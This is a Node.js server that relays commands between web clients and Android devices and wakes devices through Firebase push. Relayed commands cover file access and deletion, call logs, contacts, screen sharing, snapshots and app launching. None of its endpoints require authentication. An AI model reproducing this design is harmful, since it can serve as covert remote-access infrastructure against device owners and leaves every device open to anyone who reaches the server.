const express = require('express');
const http = require('http');
const { WebSocketServer } = require('ws');
const path = require('path');
const fs = require('fs');
const admin = require('firebase-admin');

const app = express();
const server = http.createServer(app);

const publicPath = path.join(__dirname, 'public');
if (!fs.existsSync(publicPath)) {
  console.error(`FATAL: Public directory not found at: ${publicPath}`);
  process.exit(1);
}
app.use(express.static(publicPath));
app.use(express.json());

app.use((req, res, next) => {
  console.log(`HTTP request: ${req.method} ${req.url}`);
  next();
});

// ─────────────────────────────────────────────────────────────
// Firebase Admin SDK initialization (FCM HTTP v1 API)
// ─────────────────────────────────────────────────────────────
// Requires the environment variable FIREBASE_SERVICE_ACCOUNT_JSON
// containing the full JSON contents of a Firebase service account
// private key (Firebase Console → Project settings → Service accounts
// → Generate new private key).
//
// The Admin SDK handles OAuth2 token generation automatically and
// targets the modern /v1/ endpoint instead of the deprecated legacy
// /fcm/send endpoint.
// ─────────────────────────────────────────────────────────────

let firebaseReady = false;

try {
  const raw = process.env.FIREBASE_SERVICE_ACCOUNT_JSON;
  if (!raw) {
    console.warn('[Firebase] FIREBASE_SERVICE_ACCOUNT_JSON not set — FCM push disabled.');
  } else {
    const serviceAccount = JSON.parse(raw);
    admin.initializeApp({
      credential: admin.credential.cert(serviceAccount)
    });
    firebaseReady = true;
    console.log(`[Firebase] Admin SDK initialized for project: ${serviceAccount.project_id}`);
  }
} catch (error) {
  console.error('[Firebase] Failed to initialize Admin SDK:', error.message);
  firebaseReady = false;
}

/**
 * Send a high-priority data-only FCM message to a single device token
 * using the modern HTTP v1 API.
 *
 * @param {string} token    FCM registration token of the target device
 * @param {string} command  Command string (e.g. "revive", "start_stream")
 * @returns {Promise<{success: boolean, error?: string, code?: string}>}
 */
async function sendFcmMessage(token, command) {
  if (!firebaseReady) {
    return { success: false, error: 'Firebase Admin SDK not initialized', code: 'FIREBASE_NOT_READY' };
  }

  const message = {
    token: token,
    data: { command: command },
    android: {
      priority: 'high'
    }
  };

  try {
    const messageId = await admin.messaging().send(message);
    console.log(`[FCM] Sent "${command}" → ${messageId}`);
    return { success: true };
  } catch (error) {
    const code = error.code || 'unknown';
    // Detect stale tokens so the caller can clean them up
    const stale =
      code === 'messaging/registration-token-not-registered' ||
      code === 'messaging/invalid-registration-token' ||
      code === 'messaging/invalid-argument';

    console.warn(`[FCM] Send failed (${code}): ${error.message}`);
    return { success: false, error: error.message, code, stale };
  }
}

// ─────────────────────────────────────────────────────────────
// In-memory stores
// ─────────────────────────────────────────────────────────────

const fcmTokens = new Map();          // deviceId -> fcmToken
const wsIdToDeviceId = new Map();     // wsId -> Android deviceId (for FCM)
const androidDeviceInfo = new Map();  // wsId -> { model, name, deviceId, connectedAt }

// ─────────────────────────────────────────────────────────────
// FCM endpoints
// ─────────────────────────────────────────────────────────────

// Register/update FCM token from Android app
app.post('/api/fcm-token', (req, res) => {
  const { token, deviceId } = req.body;
  if (!token || !deviceId) {
    return res.status(400).json({ error: 'Missing token or deviceId' });
  }
  fcmTokens.set(deviceId, token);
  console.log(`[FCM] Registered token for device: ${deviceId} -> ${token.substring(0, 15)}...`);
  res.json({ success: true, totalDevices: fcmTokens.size });
});

// Send FCM to ONE specific device (by deviceId or by currently-connected wsId)
app.post('/api/fcm/send', async (req, res) => {
  let { deviceId, wsId, command } = req.body;

  if (!command) return res.status(400).json({ error: 'Missing command' });

  if (!deviceId && wsId) {
    deviceId = wsIdToDeviceId.get(wsId);
    if (!deviceId) return res.status(404).json({ error: 'No device mapping for wsId: ' + wsId });
  }
  if (!deviceId) return res.status(400).json({ error: 'Missing deviceId or wsId' });

  const token = fcmTokens.get(deviceId);
  if (!token) return res.status(404).json({ error: 'No FCM token registered for this device' });

  if (!firebaseReady) {
    return res.status(501).json({ error: 'Firebase Admin SDK not initialized on server.' });
  }

  console.log(`[FCM] Sending command: ${command} to device: ${deviceId}`);
  const result = await sendFcmMessage(token, command);

  if (result.success) {
    res.json({ success: true });
  } else {
    if (result.stale) {
      console.warn(`[FCM] Removing stale token for device: ${deviceId} (${result.code})`);
      fcmTokens.delete(deviceId);
    }
    res.status(500).json({ success: false, error: result.error, code: result.code });
  }
});

// ─────────────────────────────────────────────────────────────
// Broadcast FCM to ALL known devices (online + offline)
// Uses the persistent fcmTokens map, so it works even with
// zero devices currently connected.
// ─────────────────────────────────────────────────────────────
app.post('/api/fcm/send-to-all', async (req, res) => {
  const { command } = req.body;

  if (!command) {
    return res.status(400).json({ error: 'Missing command' });
  }

  if (fcmTokens.size === 0) {
    return res.json({
      success: true,
      sent: 0,
      failed: 0,
      message: 'No FCM tokens registered yet. Open the app on at least one device first.'
    });
  }

  if (!firebaseReady) {
    return res.status(501).json({
      error: 'Firebase Admin SDK not initialized on server.',
      knownDevices: fcmTokens.size
    });
  }

  console.log(`[FCM-Broadcast] Broadcasting "${command}" to ${fcmTokens.size} device(s)`);

  let sent = 0, failed = 0;
  const results = [];

  for (const [deviceId, token] of fcmTokens.entries()) {
    const result = await sendFcmMessage(token, command);

    if (result.success) {
      sent++;
      results.push({ deviceId, success: true, error: null });
    } else {
      failed++;
      results.push({
        deviceId,
        success: false,
        error: result.code || result.error || 'unknown'
      });

      if (result.stale) {
        console.warn(`[FCM-Broadcast] Removing stale token for device: ${deviceId} (${result.code})`);
        fcmTokens.delete(deviceId);
      }
    }
  }

  console.log(`[FCM-Broadcast] Done: sent=${sent}, failed=${failed}`);
  res.json({ success: true, sent, failed, results });
});

// List ALL known devices (connected + offline with stored token)
app.get('/api/devices/known', (req, res) => {
  const known = [];

  for (const [deviceId, token] of fcmTokens.entries()) {
    let wsId = null;
    for (const [w, d] of wsIdToDeviceId.entries()) {
      if (d === deviceId) { wsId = w; break; }
    }

    const info = wsId ? androidDeviceInfo.get(wsId) : null;
    const online = wsId ? androidClients.has(wsId) : false;

    known.push({
      deviceId,
      wsId,
      online,
      name: info?.name || null,
      model: info?.model || null,
      tokenPreview: token.substring(0, 12) + '...'
    });
  }

  res.json({
    count: known.length,
    firebaseReady,
    devices: known
  });
});

// ─────────────────────────────────────────────────────────────
// Devices REST API (currently-connected only)
// ─────────────────────────────────────────────────────────────

app.get('/api/devices', (req, res) => {
  const devices = [];
  androidClients.forEach((ws, wsId) => {
    const info = androidDeviceInfo.get(wsId) || {};
    devices.push({
      wsId: wsId,
      deviceId: info.deviceId || wsIdToDeviceId.get(wsId) || null,
      model: info.model || null,
      name: info.name || null,
      connectedAt: info.connectedAt || null,
      online: ws.readyState === 1
    });
  });
  res.json({ devices });
});

// ─────────────────────────────────────────────────────────────
// SPA fallback
// ─────────────────────────────────────────────────────────────

app.get(/^(?!\/api).*/, (req, res) => {
  const indexPath = path.join(publicPath, 'index.html');
  if (fs.existsSync(indexPath)) {
    console.log(`Serving index.html for ${req.url}`);
    res.sendFile(indexPath);
  } else {
    console.error(`FATAL: index.html not found at: ${indexPath}`);
    res.status(404).send('index.html not found');
  }
});

// ─────────────────────────────────────────────────────────────
// Native WebSocket Server
// ─────────────────────────────────────────────────────────────

const wss = new WebSocketServer({ server, perMessageDeflate: false });

const webClients = new Map();
const androidClients = new Map();
let idCounter = 0;

function generateClientId() {
  return 'ws_' + (++idCounter) + '_' + Math.random().toString(36).substring(2, 10);
}

function sendTo(ws, message) {
  if (ws && ws.readyState === 1) ws.send(JSON.stringify(message));
}

function broadcastToAndroid(message) {
  const data = JSON.stringify(message);
  androidClients.forEach((ws) => { if (ws.readyState === 1) ws.send(data); });
}

function broadcastToWeb(message) {
  const data = JSON.stringify(message);
  webClients.forEach((ws) => { if (ws.readyState === 1) ws.send(data); });
}

function findClient(id) {
  return webClients.get(id) || androidClients.get(id);
}

function buildAndroidReadyPayload(wsId) {
  const info = androidDeviceInfo.get(wsId) || {};
  return {
    type: 'android-client-ready',
    id: wsId,
    model: info.model || null,
    name: info.name || null,
    deviceId: info.deviceId || wsIdToDeviceId.get(wsId) || null
  };
}

const relayEvents = [
  'signal',
  'call_log',
  'fs:list', 'fs:files', 'fs:download', 'fs:download_ready', 'fs:delete',
  'fs:download_start', 'fs:download_chunk', 'fs:download_complete',
  'fs:download_error', 'fs:delete_result', 'fs:upload_start', 'fs:upload_chunk',
  'fs:upload_complete',
  'fs:thumb_request', 'fs:thumb_batch',
  'fs:preview_request', 'fs:preview_meta', 'fs:preview_chunk',
  'fs:preview_complete', 'fs:preview_error', 'fs:preview_cancel',
  'cmd:start', 'cmd:stop', 'cmd:screen_share',
  'cmd:get_apps', 'cmd:get_contacts',
  'cmd:set_quality', 'cmd:launch_app', 'cmd:take_snapshot',
  'apps_list', 'contacts_list', 'device_info', 'snapshot_data'
];

wss.on('connection', (ws, req) => {
  const clientId = generateClientId();
  ws.clientId = clientId;
  ws.clientType = null;

  console.log(`Client connected: ${clientId} from ${req.socket.remoteAddress}`);

  sendTo(ws, { type: 'id', id: clientId });

  ws.on('message', (raw) => {
    let msg;
    try {
      msg = JSON.parse(raw.toString());
    } catch (e) {
      console.warn(`Invalid JSON from ${clientId}: ${raw.toString().substring(0, 100)}`);
      return;
    }

    const { type, ...payload } = msg;

    if (!type) {
      console.warn(`Message without type from ${clientId}`);
      return;
    }

    // ── Identification handshake ────────────────────────────
    if (type === 'identify') {
      const clientType = payload.clientType || payload.data;
      if (clientType !== 'web' && clientType !== 'android') {
        console.warn(`Invalid clientType from ${clientId}: ${clientType}`);
        return;
      }

      ws.clientType = clientType;
      console.log(`Client ${clientId} identified as: ${clientType}`);

      if (clientType === 'web') {
        webClients.set(clientId, ws);
        androidClients.forEach((androidWs, androidId) => {
          sendTo(androidWs, { type: 'web-client-ready', id: clientId });
          sendTo(ws, buildAndroidReadyPayload(androidId));
        });
      } else if (clientType === 'android') {
        androidClients.set(clientId, ws);

        const deviceId = payload.deviceId || null;
        if (deviceId) {
          wsIdToDeviceId.set(clientId, deviceId);
          console.log(`Mapped ${clientId} -> deviceId ${deviceId}`);
        }

        const info = {
          model: payload.model || null,
          name: payload.name || null,
          manufacturer: payload.manufacturer || null,
          deviceId: deviceId,
          connectedAt: Date.now()
        };
        androidDeviceInfo.set(clientId, info);

        console.log(`Android device info [${clientId}]: name="${info.name}", model="${info.model}"`);

        webClients.forEach((webWs, webId) => {
          sendTo(ws, { type: 'web-client-ready', id: webId });
          sendTo(webWs, buildAndroidReadyPayload(clientId));
        });
      }

      console.log(`Clients - Web: ${webClients.size}, Android: ${androidClients.size}`);
      return;
    }

    // ── Web client re-announces itself ──────────────────────
    if (type === 'web-client-ready') {
      if (!webClients.has(clientId)) {
        webClients.set(clientId, ws);
        ws.clientType = 'web';
      }
      androidClients.forEach((androidWs) => {
        sendTo(androidWs, { type: 'web-client-ready', id: clientId });
      });
      return;
    }

    // ── Relay events between clients ────────────────────────
    if (relayEvents.includes(type)) {
      const targetId = payload.to;
      const forwardMsg = { type, ...payload, from: clientId };

      if (targetId) {
        const targetWs = findClient(targetId);
        if (targetWs) {
          sendTo(targetWs, forwardMsg);
          console.log(`Relayed ${type} from ${clientId} to ${targetId}`);
        } else {
          console.warn(`Recipient ${targetId} not found for ${type}`);
          sendTo(ws, {
            type: 'error',
            message: `Recipient ${targetId} not found`,
            code: 'RECIPIENT_NOT_FOUND'
          });
        }
      } else {
        if (webClients.has(clientId)) {
          broadcastToAndroid(forwardMsg);
          console.log(`Broadcast ${type} to all Android clients`);
        } else if (androidClients.has(clientId)) {
          broadcastToWeb(forwardMsg);
          console.log(`Broadcast ${type} to all Web clients`);
        } else {
          console.warn(`Could not route ${type} from unidentified client ${clientId}`);
        }
      }
      return;
    }

    console.warn(`Unknown message type from ${clientId}: ${type}`);
  });

  ws.on('close', () => {
    console.log(`Client disconnected: ${clientId} (type: ${ws.clientType})`);
    const wasWeb = webClients.delete(clientId);
    const wasAndroid = androidClients.delete(clientId);

    if (wasWeb) {
      broadcastToAndroid({ type: 'web-client-disconnected', id: clientId });
    }
    if (wasAndroid) {
      wsIdToDeviceId.delete(clientId);
      androidDeviceInfo.delete(clientId);
      broadcastToWeb({ type: 'android-client-disconnected', id: clientId });
    }
    console.log(`Clients - Web: ${webClients.size}, Android: ${androidClients.size}`);
  });

  ws.on('error', (error) => {
    console.error(`WebSocket error from ${clientId}:`, error);
  });
});

server.on('error', (error) => {
  console.error('Server error:', error);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running at http://0.0.0.0:${PORT}`);
  console.log(`[FCM] Firebase Admin SDK: ${firebaseReady ? 'READY' : 'NOT READY'}`);
});

process.on('SIGINT', () => {
  console.log('\nShutting down server...');
  wss.close(() => {
    server.close(() => {
      console.log('Server shut down gracefully');
      process.exit(0);
    });
  });
});
